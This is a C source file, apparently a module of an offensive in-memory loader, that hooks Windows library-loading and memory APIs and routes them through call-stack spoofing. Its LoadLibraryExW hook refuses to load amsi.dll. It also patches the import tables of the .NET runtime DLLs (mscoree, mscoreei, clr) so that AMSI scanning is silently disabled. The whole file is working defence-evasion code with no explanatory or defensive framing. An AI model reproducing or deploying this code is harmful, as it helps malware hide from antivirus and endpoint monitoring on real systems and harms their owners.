#include <windows.h>
#include <wininet.h>
#include <combaseapi.h>
#include "tcg.h"
#include "spoof.h"
#include "hash.h"

DECLSPEC_IMPORT LPVOID    WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualFree    ( LPVOID, SIZE_T, DWORD );
DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$LoadLibraryW   ( LPCWSTR );
DECLSPEC_IMPORT HMODULE   WINAPI KERNEL32$LoadLibraryExW ( LPCWSTR, HANDLE, DWORD );
DECLSPEC_IMPORT int       WINAPI MSVCRT$_wcsicmp         ( const wchar_t *, const wchar_t * );
DECLSPEC_IMPORT wchar_t * WINAPI MSVCRT$wcsrchr          ( const wchar_t *, wchar_t );

HMODULE WINAPI _LoadLibraryA ( LPCSTR lpLibFileName )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( LoadLibraryA );
    call.argc = 1;
    
    call.args [ 0 ] = spoof_arg ( lpLibFileName );

    return ( HMODULE ) spoof_call ( &call );
}

HMODULE WINAPI _LoadLibraryExW ( LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags )
{
    /* get the filename from path */
    LPCWSTR back = MSVCRT$wcsrchr ( lpLibFileName, L'\\' );
    LPCWSTR fwd  = MSVCRT$wcsrchr ( lpLibFileName, L'/' );
    LPCWSTR name = back > fwd ? back : fwd;

    if ( name ) {
        name++;
    }
    else {
        name = lpLibFileName;
    }

    /* say no to amsi */
    if ( MSVCRT$_wcsicmp ( name, L"amsi.dll" ) == 0 ) {
        /* return without loading (─ ‿ ─) */
        return NULL;
    }

    /* load the module */
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$LoadLibraryExW );
    call.argc = 3;

    call.args [ 0 ] = spoof_arg ( lpLibFileName );
    call.args [ 1 ] = spoof_arg ( hFile );
    call.args [ 2 ] = spoof_arg ( dwFlags );

    /* hold the result */
    HMODULE module = ( HMODULE ) spoof_call ( &call );

    /* check to see if it's mscoreei.dll or clr.dll */
    if ( MSVCRT$_wcsicmp ( name, L"mscoreei.dll") == 0 || MSVCRT$_wcsicmp ( name, L"clr.dll") == 0  )
    {
        /* parse the module's headers */
        IMAGE_DOS_HEADER * dos_headers = ( IMAGE_DOS_HEADER * ) module;
        IMAGE_NT_HEADERS * nt_headers  = ( IMAGE_NT_HEADERS * ) ( ( DWORD_PTR ) module + dos_headers->e_lfanew );

        /* get the import directory */
        IMAGE_DATA_DIRECTORY imports_directory      = nt_headers->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
        IMAGE_IMPORT_DESCRIPTOR * import_descriptor = ( IMAGE_IMPORT_DESCRIPTOR * ) ( imports_directory.VirtualAddress + ( DWORD_PTR ) module );

        /* walk every imported module */
        while ( import_descriptor->Name != 0 )
        {
            IMAGE_THUNK_DATA * original_first_thunk = ( IMAGE_THUNK_DATA * ) ( ( DWORD_PTR ) module + import_descriptor->OriginalFirstThunk );
            IMAGE_THUNK_DATA * first_thunk          = ( IMAGE_THUNK_DATA * ) ( ( DWORD_PTR ) module + import_descriptor->FirstThunk );

            /* walk every imported function */
            while ( original_first_thunk->u1.AddressOfData != 0 )
            {
                IMAGE_IMPORT_BY_NAME * func_name = ( IMAGE_IMPORT_BY_NAME * ) ( ( DWORD_PTR ) module + original_first_thunk->u1.AddressOfData );
                DWORD func_hash = ror13hash ( ( char * ) ( func_name->Name ) );
                
                /* is the imported function LoadLibraryExW? */
                if ( func_hash == LOADLIBRARYEXW_HASH )
                {
                    /* yep, hook it */
                    DWORD old_protect = 0;

                    if ( KERNEL32$VirtualProtect ( ( LPVOID ) ( &first_thunk->u1.Function ), sizeof ( PVOID ), PAGE_READWRITE, &old_protect ) )
                    {
                        first_thunk->u1.Function = ( DWORD_PTR ) ( _LoadLibraryExW );
                        KERNEL32$VirtualProtect ( ( LPVOID ) ( &first_thunk->u1.Function ), sizeof ( PVOID ), old_protect, &old_protect);
                    }
                }

                ++original_first_thunk;
                ++first_thunk;
            }

            import_descriptor++;
        }
    }

    /* now return the module */
    return module;
}

HMODULE WINAPI _LoadLibraryW ( LPCWSTR lpLibFileName )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$LoadLibraryW );
    call.argc = 1;
    
    call.args [ 0 ] = spoof_arg ( lpLibFileName );

    HMODULE module = ( HMODULE ) spoof_call ( &call );

    /* was this mscoree.dll? */
    if ( MSVCRT$_wcsicmp ( lpLibFileName, L"mscoree.dll" ) == 0 )
    {
        /* parse the module's headers */
        IMAGE_DOS_HEADER * dos_header = ( IMAGE_DOS_HEADER * ) ( module );
        IMAGE_NT_HEADERS * nt_headers = ( IMAGE_NT_HEADERS * ) ( ( DWORD_PTR ) module + dos_header->e_lfanew );

        /* get the import directory */
        IMAGE_DATA_DIRECTORY imports_directory      = nt_headers->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
        IMAGE_IMPORT_DESCRIPTOR * import_descriptor = ( IMAGE_IMPORT_DESCRIPTOR * ) ( imports_directory.VirtualAddress + ( DWORD_PTR ) module );

        /* walk every imported module */
        while ( import_descriptor->Name != 0 )
        {
            IMAGE_THUNK_DATA * original_first_thunk = ( IMAGE_THUNK_DATA * ) ( ( DWORD_PTR ) module + import_descriptor->OriginalFirstThunk );
            IMAGE_THUNK_DATA * first_thunk          = ( IMAGE_THUNK_DATA * ) ( ( DWORD_PTR ) module + import_descriptor->FirstThunk );

            /* walk every imported function */
            while ( original_first_thunk->u1.AddressOfData != 0 )
            {
                IMAGE_IMPORT_BY_NAME * func_name = ( IMAGE_IMPORT_BY_NAME * ) ( ( DWORD_PTR ) module + original_first_thunk->u1.AddressOfData );
                DWORD func_hash = ror13hash ( ( char * ) ( func_name->Name ) );

                /* is the imported function LoadLibraryExW? */
                if ( func_hash == LOADLIBRARYEXW_HASH )
                {
                    /* yep, hook it */
                    DWORD old_protect = 0;

                    if ( KERNEL32$VirtualProtect ( ( LPVOID ) ( &first_thunk->u1.Function ), sizeof ( PVOID ), PAGE_READWRITE, &old_protect ) )
                    {
                        first_thunk->u1.Function = ( DWORD_PTR ) ( _LoadLibraryExW );
                        KERNEL32$VirtualProtect ( ( LPVOID ) ( &first_thunk->u1.Function ), sizeof ( PVOID ), old_protect, &old_protect );
                    }
                }

                ++original_first_thunk;
                ++first_thunk;
            }

            import_descriptor++;
        }
    }

    /* now return the module */
    return module;
}

LPVOID WINAPI _VirtualAlloc ( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$VirtualAlloc );
    call.argc = 4;
    
    call.args [ 0 ] = spoof_arg ( lpAddress );
    call.args [ 1 ] = spoof_arg ( dwSize );
    call.args [ 2 ] = spoof_arg ( flAllocationType );
    call.args [ 3 ] = spoof_arg ( flProtect );

    return ( LPVOID ) spoof_call ( &call );
}

BOOL WINAPI _VirtualFree ( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$VirtualFree );
    call.argc = 3;
    
    call.args [ 0 ] = spoof_arg ( lpAddress );
    call.args [ 1 ] = spoof_arg ( dwSize );
    call.args [ 2 ] = spoof_arg ( dwFreeType );

    return ( BOOL ) spoof_call ( &call );
}

BOOL WINAPI _VirtualProtect ( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$VirtualProtect );
    call.argc = 4;
    
    call.args [ 0 ] = spoof_arg ( lpAddress );
    call.args [ 1 ] = spoof_arg ( dwSize );
    call.args [ 2 ] = spoof_arg ( flNewProtect );
    call.args [ 3 ] = spoof_arg ( lpflOldProtect );

    return ( BOOL ) spoof_call ( &call );
}